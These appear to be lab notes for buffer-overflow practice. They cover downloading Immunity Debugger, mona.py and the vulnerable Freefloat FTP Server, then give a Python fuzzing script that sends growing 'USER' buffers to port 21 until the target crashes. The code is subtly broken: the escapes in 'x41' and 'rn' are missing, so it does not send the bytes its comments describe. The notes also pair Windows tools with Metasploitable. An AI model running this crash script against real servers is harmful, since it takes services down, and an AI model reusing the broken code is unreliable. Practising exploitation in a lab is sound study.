Immunity Debugger
- Download https://debugger.immunityinc.com/ID_register.py
- Install on Metaspoitable

Mona.py
- Clone https://github.com/corelan/mona
- Drop mona.py to PyCommands folder in Immunity Debugger installation path

Vulnerable FTP Server
- Download http://www.exploit-db.com/wp-content/themes/exploit/applications/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip
- Unzip and run on Metasploitable

Simple Fuzzing Script

```
# Import the required modulees the script will leverage
# This lets us use the functions in the modules instead of writing the code from scratch
import sys, socket
from time import sleep
 
# set first argument given at CLI to 'target' variable
target = sys.argv[1]
# create string of 50 A's 'x41'
buff = 'x41'*50
 
# loop through sending in a buffer with an increasing length by 50 A's
while True:
  # The "try - except" catches the programs error and takes our defined action
  try:
    # Make a connection to target system on TCP/21
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target,21))
    s.recv(1024)
 
    print "Sending buffer with length: "+str(len(buff))
    # Send in string 'USER' + the string 'buff'
    s.send("USER "+buff+"rn")
    s.close()
    sleep(1)
    # Increase the buff string by 50 A's and then the loop continues
    buff = buff + 'x41'*50
 
  except: # If we fail to connect to the server, we assume its crashed and print the statement below
    print "[+] Crash occured with buffer length: "+str(len(buff)-50)
    sys.exit()
 ```

 